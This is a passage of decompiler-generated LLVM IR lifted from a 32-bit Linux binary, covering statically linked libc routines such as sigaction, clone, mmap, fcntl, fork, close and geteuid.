  %v1_805b25f = mul i32 %v0_805b29611, 8
  %v2_805b25f = add i32 %v1_805b25f, ptrtoint (i32* @global_var_8079ca0.629 to i32)
  %v3_805b25f = inttoptr i32 %v2_805b25f to i32*
  %v4_805b25f = load i32, i32* %v3_805b25f, align 8
  %v5_805b25f = icmp eq i32 %v4_805b25f, 0
  %v1_805b267 = icmp eq i1 %v5_805b25f, false
  br i1 %v1_805b267, label %dec_label_pc_805b296, label %dec_label_pc_805b269

dec_label_pc_805b269:                             ; preds = %dec_label_pc_805b25f
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_807bca0.631 to i32), i32* %stack_var_-28, align 4
  store i32 1, i32* %v3_805b25f, align 8
  %v0_805b280 = load i32, i32* %eax.global-to-local, align 4
  %v1_805b280 = load i32, i32* @ebx, align 4
  %v2_805b280 = mul i32 %v1_805b280, 8
  %v3_805b280 = add i32 %v2_805b280, ptrtoint (i32* @global_var_8079ca4.630 to i32)
  %v4_805b280 = inttoptr i32 %v3_805b280 to i32*
  store i32 %v0_805b280, i32* %v4_805b280, align 4
  %v0_805b287 = load i32, i32* %stack_var_-28, align 4
  %v1_805b287 = call i32 @pthread_mutex_unlock(i32 %v0_805b287)
  store i32 %tmp3, i32* %eax.global-to-local, align 4
  %v0_805b290 = load i32, i32* @ebx, align 4
  store i32 %v0_805b290, i32* %arg1, align 4
  br label %dec_label_pc_805b2b1

dec_label_pc_805b296:                             ; preds = %dec_label_pc_805b25f
  %v1_805b296 = add nsw i32 %v0_805b29611, 1
  store i32 %v1_805b296, i32* @ebx, align 4
  %v7_805b29d = icmp sgt i32 %v0_805b29611, 1022
  br i1 %v7_805b29d, label %dec_label_pc_805b29f, label %dec_label_pc_805b25f

dec_label_pc_805b29f:                             ; preds = %dec_label_pc_805b296, %entry
  store i32 ptrtoint (i32* @global_var_807bca0.631 to i32), i32* %stack_var_-28, align 4
  %v1_805b2a7 = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_807bca0.631 to i32))
  br label %dec_label_pc_805b2b1

dec_label_pc_805b2b1:                             ; preds = %dec_label_pc_805b269, %dec_label_pc_805b29f
  %storemerge = phi i32 [ 11, %dec_label_pc_805b29f ], [ 0, %dec_label_pc_805b269 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_805b296, { 1, 0 }
  uselistorder i32 %v0_805b29611, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_807bca0.631 to i32), { 0, 5, 6, 1, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder label %dec_label_pc_805b2b1, { 1, 0 }
  uselistorder label %dec_label_pc_805b25f, { 1, 0 }
}

define i32 @__restore_rt(i32 %arg1) local_unnamed_addr {
dec_label_pc_805b2b8:
  %v0_805b2bd = load i32, i32* @ebx, align 4
  %v1_805b2bd = inttoptr i32 %v0_805b2bd to %sigcontext*
  %v2_805b2bd = call i32 @sigreturn(%sigcontext* %v1_805b2bd)
  %v0_805b2c5 = load i32, i32* @ebx, align 4
  %v1_805b2c5 = inttoptr i32 %v0_805b2c5 to %sigcontext*
  %v2_805b2c5 = call i32 @sigreturn(%sigcontext* %v1_805b2c5)
  ret i32 %v2_805b2c5
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805b2c7 = load i32, i32* @esi, align 4
  %v0_805b2c8 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_805b2dd = icmp eq i32* %arg2, null
  br i1 %v1_805b2dd, label %dec_label_pc_805b331, label %dec_label_pc_805b2e1

dec_label_pc_805b2e1:                             ; preds = %entry
  %v2_805b2e1 = load i32, i32* %arg2, align 4
  store i32 %v2_805b2e1, i32* %stack_var_-148, align 4
  %v1_805b2ea = add i32 %tmp11, 4
  %v3_805b2fc = bitcast i32* %stack_var_-136 to i16*
  %v4_805b2fc = call i32 @memcpy(i16* %v3_805b2fc, i32 %v1_805b2ea, i32 128)
  br label %dec_label_pc_805b331

dec_label_pc_805b331:                             ; preds = %entry, %dec_label_pc_805b2e1
  %v1_805b333 = icmp eq i32 %arg3, 0
  br i1 %v1_805b333, label %dec_label_pc_805b33b, label %dec_label_pc_805b337

dec_label_pc_805b337:                             ; preds = %dec_label_pc_805b331
  %v2_805b337 = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_805b33b

dec_label_pc_805b33b:                             ; preds = %dec_label_pc_805b331, %dec_label_pc_805b337
  %v0_805b34a = phi i32 [ 0, %dec_label_pc_805b331 ], [ %v2_805b337, %dec_label_pc_805b337 ]
  br i1 %v1_805b2dd, label %dec_label_pc_805b348, label %dec_label_pc_805b341

dec_label_pc_805b341:                             ; preds = %dec_label_pc_805b33b
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_805b348

dec_label_pc_805b348:                             ; preds = %dec_label_pc_805b33b, %dec_label_pc_805b341
  %v0_805b34b = phi %sigaction* [ null, %dec_label_pc_805b33b ], [ %phitmp, %dec_label_pc_805b341 ]
  %v5_805b353 = call i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %v0_805b34b, i32 %v0_805b34a, i32 8)
  store i32 %v5_805b353, i32* %ebx.global-to-local, align 4
  br i1 %v1_805b333, label %dec_label_pc_805b396, label %dec_label_pc_805b361

dec_label_pc_805b361:                             ; preds = %dec_label_pc_805b348
  %v2_805b361 = icmp slt i32 %v5_805b353, 0
  br i1 %v2_805b361, label %dec_label_pc_805b396, label %dec_label_pc_805b365

dec_label_pc_805b365:                             ; preds = %dec_label_pc_805b361
  %v3_805b365 = load i32, i32* %stack_var_-288, align 4
  %v2_805b369 = inttoptr i32 %arg3 to i32*
  store i32 %v3_805b365, i32* %v2_805b369, align 4
  %v2_805b371 = ptrtoint i32* %stack_var_-276 to i32
  %v1_805b376 = add i32 %arg3, 4
  %v3_805b37a = inttoptr i32 %v1_805b376 to i16*
  %v4_805b37a = call i32 @memcpy(i16* %v3_805b37a, i32 %v2_805b371, i32 128)
  %v2_805b383 = add i32 %arg3, 132
  %v3_805b383 = inttoptr i32 %v2_805b383 to i32*
  %v2_805b390 = add i32 %arg3, 136
  %v3_805b390 = inttoptr i32 %v2_805b390 to i32*
  %v0_805b39c.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b396

dec_label_pc_805b396:                             ; preds = %dec_label_pc_805b361, %dec_label_pc_805b348, %dec_label_pc_805b365
  %v0_805b39c = phi i32 [ %v5_805b353, %dec_label_pc_805b361 ], [ %v5_805b353, %dec_label_pc_805b348 ], [ %v0_805b39c.pre, %dec_label_pc_805b365 ]
  store i32 %v0_805b2c8, i32* @ebx, align 4
  store i32 %v0_805b2c7, i32* @esi, align 4
  ret i32 %v0_805b39c

; uselistorder directives
  uselistorder i1 %v1_805b333, { 1, 0 }
  uselistorder i1 %v1_805b2dd, { 1, 0 }
  uselistorder i32 %arg3, { 2, 1, 4, 3, 0, 5 }
  uselistorder label %dec_label_pc_805b396, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805b348, { 1, 0 }
  uselistorder label %dec_label_pc_805b33b, { 1, 0 }
  uselistorder label %dec_label_pc_805b331, { 1, 0 }
}

define i32 @clone(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 -22, i32* @eax, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805b3ad = icmp eq i32 %arg1, 0
  br i1 %v1_805b3ad, label %dec_label_pc_805b40b, label %dec_label_pc_805b3b1

dec_label_pc_805b3b1:                             ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v1_805b3b5 = icmp eq i32 %arg2, 0
  br i1 %v1_805b3b5, label %dec_label_pc_805b40b, label %dec_label_pc_805b3b9

dec_label_pc_805b3b9:                             ; preds = %dec_label_pc_805b3b1
  %v1_805b3b9 = and i32 %arg2, -16
  %v1_805b3bc = add i32 %v1_805b3b9, -28
  store i32 %v1_805b3bc, i32* %ecx.global-to-local, align 4
  %v2_805b3c3 = add i32 %v1_805b3b9, -16
  %v3_805b3c3 = inttoptr i32 %v2_805b3c3 to i32*
  store i32 %arg4, i32* %v3_805b3c3, align 16
  %v1_805b3ca = load i32, i32* %ecx.global-to-local, align 4
  %v2_805b3ca = add i32 %v1_805b3ca, 8
  %v3_805b3ca = inttoptr i32 %v2_805b3ca to i32*
  store i32 %arg1, i32* %v3_805b3ca, align 4
  %v0_805b3cd = load i32, i32* %ecx.global-to-local, align 4
  %v1_805b3cd = add i32 %v0_805b3cd, 4
  %v2_805b3cd = inttoptr i32 %v1_805b3cd to i32*
  store i32 0, i32* %v2_805b3cd, align 4
  %v0_805b3d4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_805b3d4 = inttoptr i32 %v0_805b3d4 to i32*
  store i32 0, i32* %v1_805b3d4, align 4
  %v0_805b3da = load i32, i32* @ebx, align 4
  store i32 %v0_805b3da, i32* %stack_var_-4, align 4
  %v0_805b3db = load i32, i32* @esi, align 4
  %v0_805b3dc = load i32, i32* @edi, align 4
  store i32 %v0_805b3dc, i32* %stack_var_-12, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_805b3f2 = load i32, i32* %stack_var_0, align 4
  %v4_805b3f2 = call i32 @clone(i32 %v0_805b3dc, i32 %v0_805b3db, i32 %v0_805b3da, i32 %v3_805b3f2)
  store i32 %v4_805b3f2, i32* @eax, align 4
  %v2_805b3f4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b3f4, i32* @edi, align 4
  store i32 %v0_805b3db, i32* @esi, align 4
  %v2_805b3f6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b3f6, i32* @ebx, align 4
  %v2_805b3f7 = icmp slt i32 %v4_805b3f2, 0
  %v2_805b3f9 = icmp eq i1 %v2_805b3f7, false
  br i1 %v2_805b3f9, label %dec_label_pc_805b3fb, label %dec_label_pc_805b40b

dec_label_pc_805b3fb:                             ; preds = %dec_label_pc_805b3b9
  %v1_805b3f7 = icmp eq i32 %v4_805b3f2, 0
  br i1 %v1_805b3f7, label %dec_label_pc_805b3fe, label %dec_label_pc_805b3fd

dec_label_pc_805b3fd:                             ; preds = %dec_label_pc_805b3fb
  ret i32 %v4_805b3f2

dec_label_pc_805b3fe:                             ; preds = %dec_label_pc_805b3fb
  store i32 %v0_805b3db, i32* @ebp, align 4
  store i32 134591490, i32* %stack_var_-4, align 4
  call void @__pseudo_call(i32 %v2_805b3f6)
  store i32 0, i32* @ebx, align 4
  call void @exit(i32 0)
  unreachable

dec_label_pc_805b40b:                             ; preds = %dec_label_pc_805b3b9, %dec_label_pc_805b3b1, %entry
  %v0_805b40b = call i32 @__syscall_error()
  ret i32 %v0_805b40b

; uselistorder directives
  uselistorder i32 %v4_805b3f2, { 2, 1, 0, 3 }
  uselistorder i32 %v0_805b3db, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @clone, { 4, 1, 0, 3, 2 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @__sigsetjmp(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %tmp2, i32* %stack_var_4, align 4
  store i32 %tmp2, i32* %eax.global-to-local, align 4
  %v0_805b414 = load i32, i32* @ebx, align 4
  store i32 %v0_805b414, i32* %arg2, align 4
  %v0_805b416 = load i32, i32* @esi, align 4
  %v2_805b416 = add i32 %tmp2, 4
  %v3_805b416 = inttoptr i32 %v2_805b416 to i32*
  store i32 %v0_805b416, i32* %v3_805b416, align 4
  %v0_805b419 = load i32, i32* @edi, align 4
  %v1_805b419 = load i32, i32* %eax.global-to-local, align 4
  %v2_805b419 = add i32 %v1_805b419, 8
  %v3_805b419 = inttoptr i32 %v2_805b419 to i32*
  store i32 %v0_805b419, i32* %v3_805b419, align 4
  %v2_805b41c = ptrtoint i32* %stack_var_4 to i32
  %v1_805b420 = load i32, i32* %eax.global-to-local, align 4
  %v2_805b420 = add i32 %v1_805b420, 16
  %v3_805b420 = inttoptr i32 %v2_805b420 to i32*
  store i32 %v2_805b41c, i32* %v3_805b420, align 4
  %v1_805b426 = load i32, i32* %eax.global-to-local, align 4
  %v2_805b426 = add i32 %v1_805b426, 20
  %v3_805b426 = inttoptr i32 %v2_805b426 to i32*
  store i32 %arg1, i32* %v3_805b426, align 4
  %v0_805b429 = load i32, i32* @ebp, align 4
  %v1_805b429 = load i32, i32* %eax.global-to-local, align 4
  %v2_805b429 = add i32 %v1_805b429, 12
  %v3_805b429 = inttoptr i32 %v2_805b429 to i32*
  store i32 %v0_805b429, i32* %v3_805b429, align 4
  %v0_805b42c = call i32 @__sigjmp_save()
  store i32 %v0_805b42c, i32* %eax.global-to-local, align 4
  ret i32 %v0_805b42c

; uselistorder directives
  uselistorder i32* %stack_var_4, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v0_805b434 = load i32, i32* @ebx, align 4
  %v2_805b43b = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_805b43b, i32* @ebx, align 4
  %v8_805b43f = call i32 @mmap(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_805b434, i32* @ebx, align 4
  %tmp = icmp ugt i32 %v8_805b43f, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 134618556)
  ret i32 %v8_805b43f

; uselistorder directives
  uselistorder i32 %v8_805b43f, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %v0_805b450 = load i32, i32* @edi, align 4
  %v0_805b451 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805b469 = add i32 %arg2, -12
  %v6_805b46f = icmp ugt i32 %v1_805b469, 2
  br i1 %v6_805b46f, label %dec_label_pc_805b47f, label %dec_label_pc_805b471

dec_label_pc_805b471:                             ; preds = %entry
  %v4_805b475 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_805b469)
  br label %dec_label_pc_805b4a1

dec_label_pc_805b47f:                             ; preds = %entry
  store i32 %arg1, i32* @ebx, align 4
  %v3_805b487 = call i32 @fcntl(i32 %v0_805b451, i32 %tmp14, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_805b487, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v3_805b487, -4095
  br i1 %tmp, label %dec_label_pc_805b49f, label %dec_label_pc_805b493

dec_label_pc_805b493:                             ; preds = %dec_label_pc_805b47f
  %v1_805b493 = call i32 @__errno_location(i32 %v0_805b451)
  %v0_805b498 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b498 = sub i32 0, %v0_805b498
  %v2_805b49a = inttoptr i32 %v1_805b493 to i32*
  store i32 %v1_805b498, i32* %v2_805b49a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b49f

dec_label_pc_805b49f:                             ; preds = %dec_label_pc_805b47f, %dec_label_pc_805b493
  %v0_805b49f = phi i32 [ %v3_805b487, %dec_label_pc_805b47f ], [ -1, %dec_label_pc_805b493 ]
  br label %dec_label_pc_805b4a1

dec_label_pc_805b4a1:                             ; preds = %dec_label_pc_805b471, %dec_label_pc_805b49f
  %v0_805b4a6 = phi i32 [ %v4_805b475, %dec_label_pc_805b471 ], [ %v0_805b49f, %dec_label_pc_805b49f ]
  store i32 %v0_805b451, i32* @ebx, align 4
  store i32 %v0_805b450, i32* @edi, align 4
  ret i32 %v0_805b4a6

; uselistorder directives
  uselistorder i32 %v3_805b487, { 1, 0, 2 }
  uselistorder i32 %v0_805b451, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @fcntl, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_805b4a1, { 1, 0 }
  uselistorder label %dec_label_pc_805b49f, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b4a8 = load i32, i32* @edi, align 4
  store i32 %v0_805b4a8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v0_805b4c0 = load i32, i32* @ebx, align 4
  %v1_805b4c8 = call i32 @int80_syscall(i32 221)
  store i32 %v1_805b4c8, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b4c8, -4095
  br i1 %tmp, label %dec_label_pc_805b4e0, label %dec_label_pc_805b4d4

dec_label_pc_805b4d4:                             ; preds = %entry
  %v1_805b4d4 = call i32 @__errno_location(i32 %v0_805b4c0)
  %v0_805b4d9 = load i32, i32* %edi.global-to-local, align 4
  %v1_805b4d9 = sub i32 0, %v0_805b4d9
  %v2_805b4db = inttoptr i32 %v1_805b4d4 to i32*
  store i32 %v1_805b4d9, i32* %v2_805b4db, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b4e0

dec_label_pc_805b4e0:                             ; preds = %entry, %dec_label_pc_805b4d4
  %v0_805b4e3 = phi i32 [ %v1_805b4c8, %entry ], [ -1, %dec_label_pc_805b4d4 ]
  %v2_805b4e5 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b4e5, i32* %edi.global-to-local, align 4
  ret i32 %v0_805b4e3

; uselistorder directives
  uselistorder i32 %v1_805b4c8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b4e0, { 1, 0 }
}

define i32 @__syscall_rt_sigaction(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_805b4e9 = load i32, i32* @esi, align 4
  store i32 %v0_805b4e9, i32* %stack_var_-8, align 4
  %v4_805b4f1 = ptrtoint %sigaction* %arg2 to i32
  store i32 %v4_805b4f1, i32* @ecx, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805b4fd = load i32, i32* @ebx, align 4
  %v7_805b505 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_805b505, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_805b505, -4095
  br i1 %tmp, label %dec_label_pc_805b51d, label %dec_label_pc_805b511

dec_label_pc_805b511:                             ; preds = %entry
  %v1_805b511 = call i32 @__errno_location(i32 %v0_805b4fd)
  %v0_805b516 = load i32, i32* %esi.global-to-local, align 4
  %v1_805b516 = sub i32 0, %v0_805b516
  %v2_805b518 = inttoptr i32 %v1_805b511 to i32*
  store i32 %v1_805b516, i32* %v2_805b518, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805b51d

dec_label_pc_805b51d:                             ; preds = %entry, %dec_label_pc_805b511
  %v0_805b51e = phi i32 [ %v7_805b505, %entry ], [ -1, %dec_label_pc_805b511 ]
  %v2_805b520 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805b520, i32* @esi, align 4
  ret i32 %v0_805b51e

; uselistorder directives
  uselistorder i32 %v7_805b505, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b51d, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b54c = load i32, i32* @edi, align 4
  store i32 %v0_805b54c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805b554 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805b55c = call i32 @close(i32 %v0_805b554)
  store i32 %v0_805b554, i32* @ebx, align 4
  store i32 %v1_805b55c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b55c, -4095
  br i1 %tmp, label %dec_label_pc_805b574, label %dec_label_pc_805b568

dec_label_pc_805b568:                             ; preds = %entry
  %v1_805b568 = call i32 @__errno_location(i32 %v0_805b554)
  %v0_805b56d = load i32, i32* %edi.global-to-local, align 4
  %v1_805b56d = sub i32 0, %v0_805b56d
  %v2_805b56f = inttoptr i32 %v1_805b568 to i32*
  store i32 %v1_805b56d, i32* %v2_805b56f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b574

dec_label_pc_805b574:                             ; preds = %entry, %dec_label_pc_805b568
  %v0_805b575 = phi i32 [ %v1_805b55c, %entry ], [ -1, %dec_label_pc_805b568 ]
  %v2_805b574 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805b574, i32* @edx, align 4
  %v2_805b578 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b578, i32* @edi, align 4
  ret i32 %v0_805b575

; uselistorder directives
  uselistorder i32 %v1_805b55c, { 1, 0, 2 }
  uselistorder i32 %v0_805b554, { 1, 0, 2 }
  uselistorder i32 (i32)* @close, { 26, 25, 24, 23, 22, 21, 4, 3, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b574, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b57c = load i32, i32* @ebx, align 4
  store i32 %v0_805b57c, i32* %stack_var_-4, align 4
  %v1_805b585 = call i32 @fork(i32 %v0_805b57c)
  store i32 %v1_805b585, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b585, -4095
  br i1 %tmp, label %dec_label_pc_805b59c, label %dec_label_pc_805b590

dec_label_pc_805b590:                             ; preds = %entry
  %v0_805b590 = load i32, i32* %stack_var_-4, align 4
  %v1_805b590 = call i32 @__errno_location(i32 %v0_805b590)
  %v0_805b595 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b595 = sub i32 0, %v0_805b595
  %v2_805b597 = inttoptr i32 %v1_805b590 to i32*
  store i32 %v1_805b595, i32* %v2_805b597, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b59c

dec_label_pc_805b59c:                             ; preds = %entry, %dec_label_pc_805b590
  %v0_805b59d = phi i32 [ %v1_805b585, %entry ], [ -1, %dec_label_pc_805b590 ]
  %v2_805b5a0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b5a0, i32* @ebx, align 4
  ret i32 %v0_805b59d

; uselistorder directives
  uselistorder i32 %v1_805b585, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32)* @fork, { 10, 9, 8, 7, 2, 6, 5, 4, 3, 1, 0 }
  uselistorder label %dec_label_pc_805b59c, { 1, 0 }
}

define i32 @__libc_fsync(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b5a4 = load i32, i32* @edi, align 4
  store i32 %v0_805b5a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_805b5ac = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805b5b4 = call i32 @fsync(i32 %v0_805b5ac)
  store i32 %v1_805b5b4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b5b4, -4095
  br i1 %tmp, label %dec_label_pc_805b5cc, label %dec_label_pc_805b5c0

dec_label_pc_805b5c0:                             ; preds = %entry
  %v1_805b5c0 = call i32 @__errno_location(i32 %v0_805b5ac)
  %v0_805b5c5 = load i32, i32* %edi.global-to-local, align 4
  %v1_805b5c5 = sub i32 0, %v0_805b5c5
  %v2_805b5c7 = inttoptr i32 %v1_805b5c0 to i32*
  store i32 %v1_805b5c5, i32* %v2_805b5c7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805b5cc

dec_label_pc_805b5cc:                             ; preds = %entry, %dec_label_pc_805b5c0
  %v0_805b5cd = phi i32 [ %v1_805b5b4, %entry ], [ -1, %dec_label_pc_805b5c0 ]
  %v2_805b5d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b5d0, i32* @edi, align 4
  ret i32 %v0_805b5cd

; uselistorder directives
  uselistorder i32 %v1_805b5b4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805b5cc, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_805b5d7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_805b5de = call i32 @getrlimit(i32 7, i32 %v2_805b5d7)
  store i32 256, i32* @edx, align 4
  %v2_805b5eb = icmp slt i32 %v2_805b5de, 0
  br i1 %v2_805b5eb, label %dec_label_pc_805b5f3, label %dec_label_pc_805b5ef

dec_label_pc_805b5ef:                             ; preds = %entry
  %v3_805b5ef = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_805b5ef, i32* @edx, align 4
  br label %dec_label_pc_805b5f3

dec_label_pc_805b5f3:                             ; preds = %entry, %dec_label_pc_805b5ef
  %v0_805b5f3 = phi i32 [ 256, %entry ], [ %v3_805b5ef, %dec_label_pc_805b5ef ]
  ret i32 %v0_805b5f3

; uselistorder directives
  uselistorder i32 (i32, i32)* @getrlimit, { 1, 0 }
  uselistorder label %dec_label_pc_805b5f3, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b5fc = load i32, i32* @ebx, align 4
  store i32 %v0_805b5fc, i32* %stack_var_-4, align 4
  %v1_805b605 = call i32 @int80_syscall(i32 201)
  store i32 %v1_805b605, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b605, -4095
  br i1 %tmp, label %dec_label_pc_805b61c, label %dec_label_pc_805b610

dec_label_pc_805b610:                             ; preds = %entry
  %v0_805b610 = load i32, i32* %stack_var_-4, align 4
  %v1_805b610 = call i32 @__errno_location(i32 %v0_805b610)
  %v0_805b615 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805b615 = sub i32 0, %v0_805b615
  %v2_805b617 = inttoptr i32 %v1_805b610 to i32*
  store i32 %v1_805b615, i32* %v2_805b617, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805b61c

dec_label_pc_805b61c:                             ; preds = %entry, %dec_label_pc_805b610
  %v0_805b61d = phi i32 [ %v1_805b605, %entry ], [ -1, %dec_label_pc_805b610 ]
  %v2_805b620 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805b620, i32* @ebx, align 4
  ret i32 %v0_805b61d

; uselistorder directives
  uselistorder i32 %v1_805b605, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805b61c, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805b624 = load i32, i32* @global_var_807df14.588, align 4
  store i32 %v0_805b624, i32* @edx, align 4
  %v1_805b62f = icmp eq i32 %v0_805b624, 0
  %v1_805b631 = icmp eq i1 %v1_805b62f, false
  %v4_805b631 = select i1 %v1_805b631, i32 %v0_805b624, i32 4096
  ret i32 %v4_805b631
}

define i32 @__libc_getpid(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805b638 = load i32, i32* @ebx, align 4
  store i32 %v0_805b638, i32* %stack_var_-4, align 4
  %v1_805b641 = call i32 @getpid(i32 %v0_805b638)
  store i32 %v1_805b641, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805b641, -4095
